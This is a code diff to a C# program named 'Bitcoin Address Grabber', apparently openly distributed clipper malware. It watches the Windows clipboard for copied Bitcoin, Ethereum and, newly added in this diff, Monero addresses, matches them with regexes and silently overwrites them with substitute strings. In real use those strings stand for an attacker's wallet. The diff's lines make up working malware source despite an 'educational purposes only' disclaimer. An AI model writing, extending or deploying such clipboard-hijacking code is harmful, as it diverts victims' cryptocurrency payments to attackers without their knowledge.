@@ -6,7 +6,7 @@ using System.Text.RegularExpressions;
 
 /*
  * │ Author       : NYAN CAT
- * │ Name         : Bitcoin Address Grabber v0.2
+ * │ Name         : Bitcoin Address Grabber v0.3
  * │ Contact      : https:github.com/NYAN-x-CAT
  * 
  * This program Is distributed for educational purposes only.
@@ -82,12 +82,7 @@ namespace Bitcoin_Grabber
             {
                 if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                 {
-                    string input = Clipboard.GetText();
-
-                    /* the address always starts with 1 or 3 or bc1
-                     * the length is between 26-35 characters
-                     * more info https://en.bitcoin.it/wiki/Address
-                     */
+                    string currentClipboard = Clipboard.GetText();
 
                     string btcReplacement = "Bitcoin";
                     Regex btcPattern = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"); //btc
@@ -95,14 +90,22 @@ namespace Bitcoin_Grabber
                     string ethereumReplacement = "Ethereum";
                     Regex ethereumPattern = new Regex(@"\b0x[a-fA-F0-9]{40}\b"); //ethereum
 
-                    if (btcPattern.Match(input).Success)
+                    string xmrReplacement = "XMR";
+                    Regex xmrPattern = new Regex(@"\b4([0-9]|[A-B])(.){93}\b"); //xmr
+
+                    if (btcPattern.Match(currentClipboard).Success)
                     {
-                        string result = btcPattern.Replace(input, btcReplacement);
+                        string result = btcPattern.Replace(currentClipboard, btcReplacement);
                         Clipboard.SetText(result);
                     }
-                    else if (ethereumPattern.Match(input).Success)
+                    else if (ethereumPattern.Match(currentClipboard).Success)
                     {
-                        string result = ethereumPattern.Replace(input, ethereumReplacement);
+                        string result = ethereumPattern.Replace(currentClipboard, ethereumReplacement);
+                        Clipboard.SetText(result);
+                    }
+                    else if (xmrPattern.Match(currentClipboard).Success)
+                    {
+                        string result = xmrPattern.Replace(currentClipboard, xmrReplacement);
                         Clipboard.SetText(result);
                     }
                 }
